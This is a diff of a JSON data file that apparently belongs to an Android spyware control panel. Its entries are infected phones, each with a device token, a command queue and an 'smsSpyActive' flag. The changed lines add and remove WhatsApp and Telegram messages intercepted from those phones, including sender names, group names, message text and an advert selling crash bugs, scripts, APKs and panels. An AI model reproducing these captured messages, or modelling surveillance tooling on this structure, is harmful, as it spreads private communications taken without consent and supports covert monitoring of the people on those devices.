@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777974284,
+    "lastSeen": 1776777982505,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3566 pesan dari 22 chat",
+        "time": "21/04 20:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777982988
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:48",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775730422
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (82 pesan): ~ BASS STR",
-        "content": "📷 HART AJA DEH STOK PRIBADI BASS STORE LOG GOGLE BIND KOS",
-        "time": "21/04 19:48",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775730181
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777975695,
+    "lastSeen": 1776777981559,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ROOM PUBLIK BY JEFF: Rose",
+        "content": "I've kicked Morlana $$$.",
+        "time": "21/04 20:26",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777976543
+      },
       {
         "appName": "Telegram",
         "sender": "⏤͟͟𝐀𝐅 || Jmbt Panjang",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:56",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776776199040
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "HALO WARGA TELEGRAM GUE ( @StevenCrasher ) \nINGIN MEMPERKENALKAN SALAH SATU PT GUE YAITU ( @IkyyNotDev2 ) AND DIA SUDAH RESMI JADI PT VIPP GUA\nJIKA KALIAN INGIN TRX MURBUG, SC, APK, ATAU PANEL BISA KE DIA YAH, AND KALO DIA NGERIP BISA LAPOR GUA🦋\nJIKA ANDA MINAT JOIN PT VIPP, PV\n@StevenCrasher",
-        "time": "21/04 19:56",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776776199015
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777973821,
+    "lastSeen": 1776777982814,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
